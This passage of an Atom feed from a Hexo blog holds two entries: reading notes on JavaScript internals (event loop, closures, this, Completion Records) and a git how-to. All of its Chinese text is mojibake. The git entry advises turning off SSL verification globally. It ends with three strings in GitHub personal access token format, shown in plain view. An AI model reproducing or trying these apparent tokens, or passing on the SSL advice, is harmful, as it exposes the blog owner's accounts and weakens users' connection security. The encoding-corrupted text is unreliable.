<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é’å±±ã®åšå®¢</title>
  <icon>https://www.gravatar.com/avatar/d6b4ccc75d3b05793059f7fa33d47f22</icon>
  <subtitle>é’å±±ã®åšå®¢</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-08T05:01:17.161Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>é’å±±</name>
    <email>lvchangjing_hit@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ã€é˜…è¯»ç¬”è®°ã€‘â€” â€” é‡å­¦å‰ç«¯ï¼ˆæå®¢æ—¶é—´ï¼‰</title>
    <link href="http://example.com/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/"/>
    <id>http://example.com/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/</id>
    <published>2021-10-06T20:49:27.000Z</published>
    <updated>2021-10-08T05:01:17.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="æ‰§è¡Œ"><a href="#æ‰§è¡Œ" class="headerlink" title="æ‰§è¡Œ"></a>æ‰§è¡Œ</h2><h3 id="äº‹ä»¶å¾ªç¯"><a href="#äº‹ä»¶å¾ªç¯" class="headerlink" title="äº‹ä»¶å¾ªç¯"></a>äº‹ä»¶å¾ªç¯</h3><p>Promiseé‡Œçš„ä»£ç ä¸ºä»€ä¹ˆæ¯”setTimeoutå…ˆæ‰§è¡Œï¼Ÿ</p><p>é¦–å…ˆï¼Œä¸€ä¸ª JavaScript å¼•æ“ä¼šå¸¸é©»äºå†…å­˜ä¸­ï¼Œå®ƒç­‰å¾…ç€æˆ‘ä»¬ï¼ˆå®¿ä¸»ï¼‰æŠŠ JavaScript ä»£ç æˆ–è€…å‡½æ•°ä¼ é€’ç»™å®ƒæ‰§è¡Œã€‚åœ¨ ES5 ä¹‹åï¼ŒJavaScript å¼•å…¥äº† Promiseã€‚æŠŠå®¿ä¸»å‘èµ·çš„ä»»åŠ¡ç§°ä¸º<strong>å®è§‚ä»»åŠ¡</strong>ï¼ŒæŠŠ JavaScript å¼•æ“å‘èµ·çš„ä»»åŠ¡ç§°ä¸º<strong>å¾®è§‚ä»»åŠ¡</strong>ã€‚</p><p>JavaScript å¼•æ“ç­‰å¾…å®¿ä¸»ç¯å¢ƒåˆ†é…å®è§‚ä»»åŠ¡ï¼ŒæŠŠè¿™ä¸€éƒ¨åˆ†ç§°ä¸ºäº‹ä»¶å¾ªç¯ã€‚å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºï¼šå®è§‚ä»»åŠ¡çš„é˜Ÿåˆ—å°±ç›¸å½“äºäº‹ä»¶å¾ªç¯ã€‚åœ¨å®è§‚ä»»åŠ¡ä¸­ï¼ŒJavaScript çš„ Promise è¿˜ä¼šäº§ç”Ÿå¼‚æ­¥ä»£ç ï¼ŒJavaScript å¿…é¡»ä¿è¯è¿™äº›å¼‚æ­¥ä»£ç åœ¨ä¸€ä¸ªå®è§‚ä»»åŠ¡ä¸­å®Œæˆï¼Œå› æ­¤ï¼Œæ¯ä¸ªå®è§‚ä»»åŠ¡ä¸­åˆåŒ…å«äº†ä¸€ä¸ªå¾®è§‚ä»»åŠ¡é˜Ÿåˆ—</p><p>å®ç° JS å¼•æ“çº§å’Œå®¿ä¸»çº§çš„ä»»åŠ¡æ—¶ï¼šPromise æ°¸è¿œåœ¨é˜Ÿåˆ—å°¾éƒ¨æ·»åŠ å¾®è§‚ä»»åŠ¡ã€‚setTimeout ç­‰å®¿ä¸» APIï¼Œåˆ™ä¼šæ·»åŠ å®è§‚ä»»åŠ¡ã€‚</p><p>å¼‚æ­¥æ‰§è¡Œçš„é¡ºåºï¼š</p><ul><li>é¦–å…ˆæˆ‘ä»¬åˆ†ææœ‰å¤šå°‘ä¸ªå®ä»»åŠ¡ï¼›</li><li>åœ¨æ¯ä¸ªå®ä»»åŠ¡ä¸­ï¼Œåˆ†ææœ‰å¤šå°‘ä¸ªå¾®ä»»åŠ¡ï¼›</li><li>æ ¹æ®è°ƒç”¨æ¬¡åºï¼Œç¡®å®šå®ä»»åŠ¡ä¸­çš„å¾®ä»»åŠ¡æ‰§è¡Œæ¬¡åºï¼›</li><li>æ ¹æ®å®ä»»åŠ¡çš„è§¦å‘è§„åˆ™å’Œè°ƒç”¨æ¬¡åºï¼Œç¡®å®šå®ä»»åŠ¡çš„æ‰§è¡Œæ¬¡åºï¼›</li><li>ç¡®å®šæ•´ä¸ªé¡ºåºã€‚</li></ul><h3 id="é—­åŒ…å’Œæ‰§è¡Œä¸Šä¸‹æ–‡"><a href="#é—­åŒ…å’Œæ‰§è¡Œä¸Šä¸‹æ–‡" class="headerlink" title="é—­åŒ…å’Œæ‰§è¡Œä¸Šä¸‹æ–‡"></a>é—­åŒ…å’Œæ‰§è¡Œä¸Šä¸‹æ–‡</h3><p>ç®€å•ç†è§£ï¼Œé—­åŒ…å…¶å®åªæ˜¯ä¸€ä¸ªç»‘å®šäº†æ‰§è¡Œç¯å¢ƒçš„å‡½æ•°ã€‚é—­åŒ…åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>ç¯å¢ƒéƒ¨åˆ†<ul><li>ç¯å¢ƒï¼šå‡½æ•°çš„è¯æ³•ç¯å¢ƒï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡çš„ä¸€éƒ¨åˆ†ï¼‰</li><li>æ ‡è¯†ç¬¦åˆ—è¡¨ï¼šå‡½æ•°ä¸­ç”¨åˆ°çš„æœªå£°æ˜çš„å˜é‡</li></ul></li><li>è¡¨è¾¾å¼éƒ¨åˆ†ï¼šå‡½æ•°ä½“</li></ul><p>JavaScript æ ‡å‡†æŠŠä¸€æ®µä»£ç ï¼ˆåŒ…æ‹¬å‡½æ•°ï¼‰ï¼Œæ‰§è¡Œæ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯å®šä¹‰ä¸ºï¼šâ€œæ‰§è¡Œä¸Šä¸‹æ–‡â€ã€‚</p><p><strong>æ‰§è¡Œä¸Šä¸‹æ–‡åœ¨ ES3 ä¸­</strong>ï¼ŒåŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ã€‚</p><ul><li>scopeï¼šä½œç”¨åŸŸï¼Œä¹Ÿå¸¸å¸¸è¢«å«åšä½œç”¨åŸŸé“¾ã€‚</li><li>variable objectï¼šå˜é‡å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨å˜é‡çš„å¯¹è±¡ã€‚</li><li>this valueï¼šthis å€¼ã€‚</li></ul><p><strong>åœ¨ ES5 ä¸­</strong>ï¼š</p><ul><li>lexical environmentï¼šè¯æ³•ç¯å¢ƒï¼Œå½“è·å–å˜é‡æ—¶ä½¿ç”¨ã€‚</li><li>variable environmentï¼šå˜é‡ç¯å¢ƒï¼Œå½“å£°æ˜å˜é‡æ—¶ä½¿ç”¨ã€‚</li><li>this valueï¼šthis å€¼ã€‚</li></ul><p><strong>åœ¨ ES2018 ä¸­</strong>ï¼Œthis å€¼è¢«å½’å…¥ lexical environmentã€‚</p><ul><li>lexical environmentï¼šè¯æ³•ç¯å¢ƒï¼Œå½“è·å–å˜é‡æˆ–è€… this å€¼æ—¶ä½¿ç”¨ã€‚</li><li>variable environmentï¼šå˜é‡ç¯å¢ƒï¼Œå½“å£°æ˜å˜é‡æ—¶ä½¿ç”¨</li><li>code evaluation stateï¼šç”¨äºæ¢å¤ä»£ç æ‰§è¡Œä½ç½®ã€‚</li><li>Functionï¼šæ‰§è¡Œçš„ä»»åŠ¡æ˜¯å‡½æ•°æ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºæ­£åœ¨è¢«æ‰§è¡Œçš„å‡½æ•°ã€‚</li><li>ScriptOrModuleï¼šæ‰§è¡Œçš„ä»»åŠ¡æ˜¯è„šæœ¬æˆ–è€…æ¨¡å—æ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºæ­£åœ¨è¢«æ‰§è¡Œçš„ä»£ç ã€‚</li><li>Realmï¼šä½¿ç”¨çš„åŸºç¡€åº“å’Œå†…ç½®å¯¹è±¡å®ä¾‹ã€‚</li><li>Generatorï¼šä»…ç”Ÿæˆå™¨ä¸Šä¸‹æ–‡æœ‰è¿™ä¸ªå±æ€§ï¼Œè¡¨ç¤ºå½“å‰ç”Ÿæˆå™¨ã€‚</li></ul><p>ä¼šäº§ç”Ÿ let ä½¿ç”¨çš„ä½œç”¨åŸŸï¼š</p><ul><li>forï¼›</li><li>ifï¼›</li><li>switchï¼›</li><li>try/catch/finallyã€‚</li></ul><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p>1ã€æ™®é€šå‡½æ•°ï¼šç”¨ function å…³é”®å­—å®šä¹‰çš„å‡½æ•°</p><p>2ã€ç®­å¤´å‡½æ•°ï¼šç”¨ =&gt; è¿ç®—ç¬¦å®šä¹‰çš„å‡½æ•°</p><p>3ã€æ–¹æ³•ï¼šåœ¨ class ä¸­å®šä¹‰çš„å‡½æ•°</p><p>4ã€ç”Ÿæˆå™¨å‡½æ•°ï¼šç”¨ function * å®šä¹‰çš„å‡½æ•°ã€‚</p><p>5ã€ç±»ï¼šç”¨ class å®šä¹‰çš„ç±»ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯å‡½æ•°ã€‚</p><p>6ã€å¼‚æ­¥å‡½æ•°ï¼šæ™®é€šå‡½æ•°ã€ç®­å¤´å‡½æ•°å’Œç”Ÿæˆå™¨å‡½æ•°åŠ ä¸Š async å…³é”®å­—ã€‚</p><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>this æ˜¯æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚åŒä¸€ä¸ªå‡½æ•°è°ƒç”¨æ–¹å¼ä¸åŒï¼Œå¾—åˆ°çš„ this å€¼ä¹Ÿä¸åŒã€‚</p><p>å®šä¹‰ï¼š<strong>è°ƒç”¨å‡½æ•°æ—¶ä½¿ç”¨çš„å¼•ç”¨ï¼Œå†³å®šäº†å‡½æ•°æ‰§è¡Œæ—¶åˆ»çš„ this å€¼ã€‚</strong></p><p>åŸç†ï¼š<strong>æˆ‘ä»¬è·å–å‡½æ•°çš„è¡¨è¾¾å¼ï¼Œå®ƒå®é™…ä¸Šè¿”å›çš„å¹¶éå‡½æ•°æœ¬èº«ï¼Œè€Œæ˜¯ä¸€ä¸ª Reference ç±»å‹ã€‚</strong>Reference ç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå±æ€§å€¼ã€‚å½“åšä¸€äº›ç®—æœ¯è¿ç®—æ—¶ï¼ŒReference ç±»å‹ä¼šè¢«è§£å¼•ç”¨ï¼Œè·å–çœŸæ­£çš„å€¼æ¥å‚ä¸è¿ç®—ï¼Œè€Œç±»ä¼¼å‡½æ•°è°ƒç”¨ã€delete ç­‰æ“ä½œï¼Œéƒ½éœ€è¦ç”¨åˆ° Reference ç±»å‹ä¸­çš„å¯¹è±¡ã€‚ï¼ˆå¦‚ Reference ç±»å‹ä¸­çš„å¯¹è±¡è¢«å½“ä½œ this å€¼ï¼Œä¼ å…¥äº†æ‰§è¡Œå‡½æ•°æ—¶çš„ä¸Šä¸‹æ–‡ï¼‰</p><p>ä½†ç®­å¤´å‡½æ•°ä¸è®ºç”¨ä»€ä¹ˆå¼•ç”¨æ¥è°ƒç”¨å®ƒï¼Œéƒ½ä¸å½±å“å®ƒçš„ this å€¼ã€‚</p><p>JavaScript æ ‡å‡†å®šä¹‰äº† [[thisMode]] ç§æœ‰å±æ€§ï¼Œå®ƒæœ‰ä¸‰ä¸ªå–å€¼ï¼š</p><p>[[thisMode]] ç§æœ‰å±æ€§æœ‰ä¸‰ä¸ªå–å€¼ã€‚</p><ul><li>lexicalï¼šè¡¨ç¤ºä»ä¸Šä¸‹æ–‡ä¸­æ‰¾ thisï¼Œå¯¹åº”ç®­å¤´å‡½æ•°ã€‚</li><li>globalï¼šè¡¨ç¤ºå½“ this ä¸º undefined æ—¶ï¼Œå–å…¨å±€å¯¹è±¡ï¼Œå¯¹åº”æ™®é€šå‡½æ•°ã€‚</li><li>strictï¼šå½“ä¸¥æ ¼æ¨¡å¼æ—¶ä½¿ç”¨ï¼Œthis ä¸¥æ ¼æŒ‰ç…§è°ƒç”¨æ—¶ä¼ å…¥çš„å€¼ï¼Œå¯èƒ½ä¸º null æˆ–è€… undefinedã€‚</li></ul><h3 id="è¯­å¥"><a href="#è¯­å¥" class="headerlink" title="è¯­å¥"></a>è¯­å¥</h3><p>tryé‡Œé¢æ”¾returnï¼Œfinallyè¿˜ä¼šæ‰§è¡Œå—ï¼Ÿ</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(foo()); </span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>finally ç¡®å®æ‰§è¡Œäº†ï¼Œè€Œä¸” return è¯­å¥ä¹Ÿç”Ÿæ•ˆäº†ï¼Œfoo() è¿”å›äº†ç»“æœ 0ã€‚</p><p>å¦‚æœåœ¨ finally ä¸­åŠ å…¥ return è¯­å¥ï¼Œè¿™ä¼šè¦†ç›– try ä¸­çš„ returnã€‚</p><p><strong>è¿™èƒŒåæœ‰ä¸€å¥—æœºåˆ¶åœ¨è¿ä½œï¼Œè¿™ä¸€æœºåˆ¶çš„åŸºç¡€æ­£æ˜¯ JavaScript è¯­å¥æ‰§è¡Œçš„å®ŒæˆçŠ¶æ€ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªæ ‡å‡†ç±»å‹æ¥è¡¨ç¤ºï¼šCompletion Recordã€‚</strong>Completion Record è¡¨ç¤ºä¸€ä¸ªè¯­å¥æ‰§è¡Œå®Œä¹‹åçš„ç»“æœï¼Œå®ƒæœ‰ä¸‰ä¸ªå­—æ®µï¼š</p><ul><li>[[type]] è¡¨ç¤ºå®Œæˆçš„ç±»å‹ï¼Œæœ‰ break continue return throw å’Œ normal å‡ ç§ç±»å‹ï¼›</li><li>[[value]] è¡¨ç¤ºè¯­å¥çš„è¿”å›å€¼ï¼Œå¦‚æœè¯­å¥æ²¡æœ‰ï¼Œåˆ™æ˜¯ emptyï¼›</li><li>[[target]] è¡¨ç¤ºè¯­å¥çš„ç›®æ ‡ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ª JavaScript æ ‡ç­¾ã€‚</li></ul><p>è¯­å¥çš„åˆ†ç±»ï¼š</p><p><img src="https://i.loli.net/2021/10/08/AcLRijXWtOCmvs6.png" alt="image.png"></p><p>1ã€æ™®é€šçš„è¯­å¥ï¼šä¸å¸¦æ§åˆ¶èƒ½åŠ›çš„è¯­å¥ã€‚æ™®é€šè¯­å¥æ‰§è¡Œåï¼Œä¼šå¾—åˆ° [[type]] ä¸º normal çš„ Completion Recordï¼ŒJavaScript å¼•æ“é‡åˆ°è¿™æ ·çš„ Completion Recordï¼Œä¼šç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡è¯­å¥ã€‚è¿™äº›è¯­å¥ä¸­ï¼Œåªæœ‰è¡¨è¾¾å¼è¯­å¥ä¼šäº§ç”Ÿ [[value]]ã€‚ï¼ˆChrome æ§åˆ¶å°æ˜¾ç¤ºçš„æ­£æ˜¯è¯­å¥çš„ Completion Record çš„ [[value]]ã€‚ï¼‰</p><p>2ã€è¯­å¥å—ï¼šæ‹¿å¤§æ‹¬å·æ‹¬èµ·æ¥çš„ä¸€ç»„è¯­å¥ï¼Œå®ƒæ˜¯ä¸€ç§è¯­å¥çš„å¤åˆç»“æ„ï¼Œå¯ä»¥åµŒå¥—ã€‚è¯­å¥å—å†…éƒ¨è¯­å¥çš„ Completion Record çš„ [[type]] å¦‚æœä¸ä¸º normalï¼Œä¼šæ‰“æ–­è¯­å¥å—åç»­çš„è¯­å¥æ‰§è¡Œã€‚</p><p>return è¯­å¥å¯èƒ½äº§ç”Ÿ return æˆ–è€… throw ç±»å‹çš„ Completion Recordã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå†…éƒ¨ä¸ºæ™®é€šè¯­å¥çš„è¯­å¥å—ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è¯­å¥çš„ Completion Record([[type]] [[value]] [[target]]) è§æ³¨é‡Š</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>; <span class="comment">// normal, empty, empty</span></span><br><span class="line">  i ++; <span class="comment">// normal, 1, empty</span></span><br><span class="line">  <span class="built_in">console</span>.log(i) <span class="comment">//normal, undefined, empty</span></span><br><span class="line">&#125; <span class="comment">// normal, undefined, empty</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœåŠ å…¥ return </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>; <span class="comment">// normal, empty, empty</span></span><br><span class="line">  <span class="keyword">return</span> i; <span class="comment">// return, 1, empty</span></span><br><span class="line">  i ++; </span><br><span class="line">  <span class="built_in">console</span>.log(i)</span><br><span class="line">&#125; <span class="comment">// return, 1, empty</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä¿è¯äº†é normal çš„å®Œæˆç±»å‹å¯ä»¥ç©¿é€å¤æ‚çš„è¯­å¥åµŒå¥—ç»“æ„ï¼Œäº§ç”Ÿæ§åˆ¶æ•ˆæœã€‚</p><p>3ã€æ§åˆ¶å‹è¯­å¥ï¼šå¸¦æœ‰ ifã€switch å…³é”®å­—ï¼Œå®ƒä»¬ä¼šå¯¹ä¸åŒç±»å‹çš„ Completion Record äº§ç”Ÿååº”ã€‚</p><p>æ§åˆ¶ç±»è¯­å¥åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œä¸€ç±»æ˜¯å¯¹å…¶å†…éƒ¨é€ æˆå½±å“ï¼Œå¦‚ ifã€switchã€while/forã€tryã€‚å¦ä¸€ç±»æ˜¯å¯¹å¤–éƒ¨é€ æˆå½±å“å¦‚ breakã€continueã€returnã€throwï¼Œè¿™ä¸¤ç±»è¯­å¥çš„é…åˆï¼Œä¼šäº§ç”Ÿæ§åˆ¶ä»£ç æ‰§è¡Œé¡ºåºå’Œæ‰§è¡Œé€»è¾‘çš„æ•ˆæœã€‚</p><p><img src="https://i.loli.net/2021/10/08/ogYhf6JDtXQE8bH.png" alt="image.png"></p><ul><li>æ¶ˆè´¹æŒ‡åœ¨è¿™ä¸€å±‚å°±æ‰§è¡Œäº†ä»£ç </li><li>ç©¿é€æŒ‡å»ä¸Šä¸€å±‚çš„ä½œç”¨åŸŸæˆ–è€…æ§åˆ¶è¯­å¥æ‰¾å¯ä»¥æ¶ˆè´¹ breakï¼Œcontinue çš„æ‰§è¡Œç¯å¢ƒ</li></ul><p>4ã€å¸¦æ ‡ç­¾çš„è¯­å¥ï¼šæœ€åä¸€ä¸ªå­—æ®µï¼štarget æ¶‰åŠäº† JavaScript ä¸­çš„å¸¦æ ‡ç­¾çš„è¯­å¥ã€‚ä»»ä½• JavaScript è¯­å¥æ˜¯å¯ä»¥åŠ æ ‡ç­¾çš„ï¼Œåœ¨è¯­å¥å‰åŠ å†’å·å³å¯ï¼š<code>firstStatement: var i = 1;</code> è¿™ä¸ªä¸œè¥¿å”¯ä¸€æœ‰ä½œç”¨çš„æ—¶å€™æ˜¯ï¼šä¸å®Œæˆè®°å½•ç±»å‹ä¸­çš„ target ç›¸é…åˆï¼Œç”¨äºè·³å‡ºå¤šå±‚å¾ªç¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">outer: <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="attr">inner</span>: <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span> outer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;finished&quot;</span>)</span><br></pre></td></tr></table></figure><p>break/continue è¯­å¥å¦‚æœåè·Ÿäº†å…³é”®å­—ï¼Œä¼šäº§ç”Ÿå¸¦ target çš„å®Œæˆè®°å½•ã€‚ä¸€æ—¦å®Œæˆè®°å½•å¸¦äº† targetï¼Œé‚£ä¹ˆåªæœ‰æ‹¥æœ‰å¯¹åº” label çš„å¾ªç¯è¯­å¥ä¼šæ¶ˆè´¹å®ƒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JavaScript&quot;&gt;&lt;a href=&quot;#JavaScript&quot; class=&quot;headerlink&quot; title=&quot;JavaScript&quot;&gt;&lt;/a&gt;JavaScript&lt;/h1&gt;&lt;h2 id=&quot;æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#æ‰§è¡Œ&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="é˜…è¯»ç¬”è®°" scheme="http://example.com/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="å‰ç«¯" scheme="http://example.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>ã€çŸ¥è¯†æ•´ç†ã€‘â€” â€” git æ“ä½œ</title>
    <link href="http://example.com/2021/09/29/%E3%80%90%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E3%80%91%E2%80%94%20%E2%80%94%20git%20%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2021/09/29/%E3%80%90%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E3%80%91%E2%80%94%20%E2%80%94%20git%20%E6%93%8D%E4%BD%9C/</id>
    <published>2021-09-29T15:12:34.000Z</published>
    <updated>2021-10-08T13:00:47.440Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºæ¯æ¬¡ä½¿ç”¨ git æ“ä½œéƒ½éœ€è¦æœç´¢ä¸€ç•ªï¼Œå¥½å¤šæµç¨‹è®°ä¸ä½é¡ºåºï¼Œå°±æ‰“ç®—åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹ä½¿ç”¨ git æ—¶çš„ä¸€äº›å¸¸ç”¨æ“ä½œä»¥åŠç»å¸¸é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆå§~</p><h2 id="æ‹‰å–é¡¹ç›®"><a href="#æ‹‰å–é¡¹ç›®" class="headerlink" title="æ‹‰å–é¡¹ç›®"></a>æ‹‰å–é¡¹ç›®</h2><p>éƒ¨åˆ†å‚è€ƒè‡ª<a href="https://blog.csdn.net/yuhan61659/article/details/81171351">åšå®¢</a></p><p>1ã€æœ¬åœ°æ–°å»ºæ–‡ä»¶å¤¹ï¼ˆæœ€å¥½ä¸ºè‹±æ–‡åï¼‰</p><p>2ã€é€šè¿‡ <code>git init</code> ç”Ÿæˆ .git æ–‡ä»¶</p><p>3ã€é…ç½®æœ¬åœ°ä»“åº“çš„è´¦å·é‚®ç®±gitï¼š</p><p><code>$ git config --global user.name &quot;Your Name&quot;</code></p><p><code>$ git config --global user.email &quot;email@163.com&quot;</code></p><p>4ã€ä¸ºäº†é¿å…æ¯æ¬¡è¿œç¨‹è®¿é—®éœ€è¦è¾“å¯†ç ï¼Œæ‰€ä»¥ä½¿ç”¨sshç™»é™†ã€‚sshåº”è¯¥ä¸æœ¬æœºä¿¡æ¯ç»‘å®šã€‚æŸ¥çœ‹è‡ªå·±ç”µè„‘C:\Users\Administrator ç›®å½•ä¸‹æ˜¯å¦æœ‰ .ssh æ–‡ä»¶å¤¹ã€‚å¦‚æœæ²¡æœ‰å°±éœ€è¦ç”Ÿæˆï¼š</p><p><code>$ ssh-keygen -t rsa -C &quot;email@163.com&quot;</code></p><p>ssh åœ¨ Github ä¸­å¤‡ä»½åæ‰èƒ½è¢«éªŒè¯ã€‚åœ¨ github çš„ MyProfile ä¸­ï¼Œç‚¹å‡» Add Public Key</p><p>5ã€key ä¸­çš„å†…å®¹åœ¨ C:\Users\Administrator é‡Œé¢çš„ .sshæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ id_rsa.pubï¼Œå…¨éƒ¨å¤åˆ¶å†…å®¹åˆ° key</p><p>6ã€å…‹éš†é¡¹ç›®ï¼š<code>$ git clone https://github.com/***.git</code></p><h2 id="åˆ›å»ºä»“åº“-amp-amp-ä¸Šä¼ ä»£ç "><a href="#åˆ›å»ºä»“åº“-amp-amp-ä¸Šä¼ ä»£ç " class="headerlink" title="åˆ›å»ºä»“åº“&amp;&amp;ä¸Šä¼ ä»£ç "></a>åˆ›å»ºä»“åº“&amp;&amp;ä¸Šä¼ ä»£ç </h2><p>1ã€å•å‡» <strong>New repository</strong></p><p><img src="https://i.loli.net/2021/09/30/9YDmk2LhM7gcq4r.png" alt="image.png"></p><p>2ã€è¾“å…¥ä»“åº“åï¼ˆè‹±æ–‡ï¼‰ï¼Œæ·»åŠ  Descriptionï¼ˆå¯é€‰ï¼‰ï¼Œè®¾ç½®ä»“åº“ç±»å‹ï¼Œé€‰æ‹© <strong>Initialize this repository with a README</strong>ï¼Œç‚¹å‡» **Create repository **å°±å¯ä»¥äº†ã€‚</p><p>3ã€å°†è‡ªå·±å†™çš„ä»£ç æ·»åŠ åˆ°æš‚å­˜åŒºï¼š <code>git add .</code></p><p>4ã€å¯ä»¥æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€å˜åŒ–ä¿¡æ¯ï¼š <code>git status</code></p><p>5ã€å°†æœ¬åœ°çš„ä»£ç å…³è”åˆ°githubä¸Šï¼ˆå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡ä¸Šä¼ ä»£ç ï¼‰ï¼š <code>git remote add origin git@github.com:***.git</code></p><h2 id="æ›´æ–°æœ¬åœ°ä»£ç åˆ°ä»“åº“"><a href="#æ›´æ–°æœ¬åœ°ä»£ç åˆ°ä»“åº“" class="headerlink" title="æ›´æ–°æœ¬åœ°ä»£ç åˆ°ä»“åº“"></a>æ›´æ–°æœ¬åœ°ä»£ç åˆ°ä»“åº“</h2><p>1ã€å°†è‡ªå·±å†™çš„ä»£ç æ·»åŠ åˆ°æš‚å­˜åŒºï¼š <code>git add .</code></p><p>2ã€å¯ä»¥æŸ¥çœ‹æš‚å­˜åŒºçŠ¶æ€å˜åŒ–ä¿¡æ¯ï¼š <code>git status</code></p><p>3ã€æ·»åŠ ä¸Šä¼ çš„æ³¨é‡Šï¼ˆå¿…é¡»è¦æœ‰æ³¨é‡Šå†…å®¹å“¦ï¼‰ï¼š <code>git commit -m â€œä¸Šä¼ çš„ç‰ˆæœ¬ä¿¡æ¯â€</code></p><p>4ã€ä¸Šä¼ ä»£ç åˆ° github ä¹‹å‰éœ€è¦å…ˆ pullï¼š <code>git pull origin main</code></p><p>5ã€ä¸Šä¼ ä»£ç åˆ°è¿œç¨‹ä»“åº“ï¼š <code>git push -u origin main</code></p><p><strong>åœ¨ git push æ—¶å¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼š</strong></p><p>fatal: unable to access â€˜<a href="https://github.com/***.git/&#39;">https://github.com/***.git/&#39;</a>: OpenSSL SSL_read: Connection was reset, errno 10054</p><p>äº§ç”ŸåŸå› ï¼šä¸€èˆ¬æ˜¯å› ä¸ºæœåŠ¡å™¨çš„ SSL è¯ä¹¦æ²¡æœ‰ç»è¿‡ç¬¬ä¸‰æ–¹æœºæ„çš„ç­¾ç½²ï¼Œæ‰€ä»¥æ‰æŠ¥é”™</p><p>è§£å†³æ–¹æ³•ï¼š<code>git config --global http.sslVerify &quot;false&quot;</code></p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>åšå®¢ï¼š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</p><p>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</p><p>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</p>]]></content>
    
    
      
      
